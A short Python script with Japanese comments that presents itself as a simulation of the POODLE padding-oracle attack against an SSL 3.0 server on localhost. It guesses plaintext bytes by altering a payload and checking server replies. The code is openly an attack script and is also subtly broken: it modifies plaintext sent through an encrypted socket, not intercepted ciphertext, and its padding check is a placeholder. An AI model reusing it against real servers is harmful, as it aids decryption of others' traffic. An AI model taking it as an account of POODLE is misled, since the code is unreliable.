import ssl
import socket

def connect_to_server(host, port):
    # サーバーへのSSL 3.0接続を確立

    context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)  # SSL 3.0
    sock = socket.create_connection((host, port))
    ssl_sock = context.wrap_socket(sock, server_hostname=host)
    print("Connected to server using SSL 3.0")
    return ssl_sock

def modify_payload(original_payload, byte_index, new_byte):
    # ペイロードの指定したインデックスのバイトを改変

    modified_payload = bytearray(original_payload)
    modified_payload[byte_index] = new_byte
    return bytes(modified_payload)

def is_valid_padding(response):
    # サーバー応答を解析してパディングが有効かを確認
    # 実際の応答メッセージ内容に確認後に実装
    return b"padding error" not in response.lower()

def perform_poodle_attack(ssl_sock, original_payload):
    #POODLE攻撃のシミュレーション
    block_size = 16  # ブロックサイズ（AESの場合は16バイト）
    assert len(original_payload) % block_size == 0, "Payload length must be a multiple of block size."

    decrypted_bytes = bytearray(len(original_payload))  # 復号されたバイト列を格納
    known_bytes = 0  # 復号済みバイト数

    for block_start in range(len(original_payload) - block_size, -1, -block_size):
        print(f"Attacking block starting at index {block_start}")

        for byte_position in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_position
            print(f"Trying to decrypt byte at position {byte_position}")

            for guess in range(256):  # 0x00〜0xFFを試行
                modified_payload = bytearray(original_payload)

                # Knownバイトを改変
                for i in range(byte_position + 1, block_size):
                    modified_payload[block_start + i] ^= (
                        decrypted_bytes[block_start + i] ^ padding_value
                    )

                modified_payload[block_start + byte_position] ^= guess ^ padding_value

                try:
                    ssl_sock.send(modified_payload)
                    response = ssl_sock.recv(1024)  # サーバー応答を確認

                    if is_valid_padding(response):
                        print(f"Valid padding with guess: {hex(guess)}")

                        # 復号されたバイトを保存
                        decrypted_bytes[block_start + byte_position] = guess
                        known_bytes += 1
                        break
                except Exception as e:
                    print(f"Error occurred: {e}")
                    continue  # 応答が異常なら次の値を試行

        print(f"Decrypted block: {decrypted_bytes[block_start:block_start + block_size]}")

    print("Decryption complete!")
    print(f"Decrypted bytes: {decrypted_bytes.hex()}")

def poodle_attack(host, port):
    try:
        ssl_sock = connect_to_server(host, port)
        original_payload = b"A" * 48  # 攻撃用のペイロード（48バイト）
        perform_poodle_attack(ssl_sock, original_payload)
    finally:
        ssl_sock.close()
        print("Connection closed.")


if __name__ == "__main__":
    host = "127.0.0.1"
    port = 8443
    poodle_attack(host, port)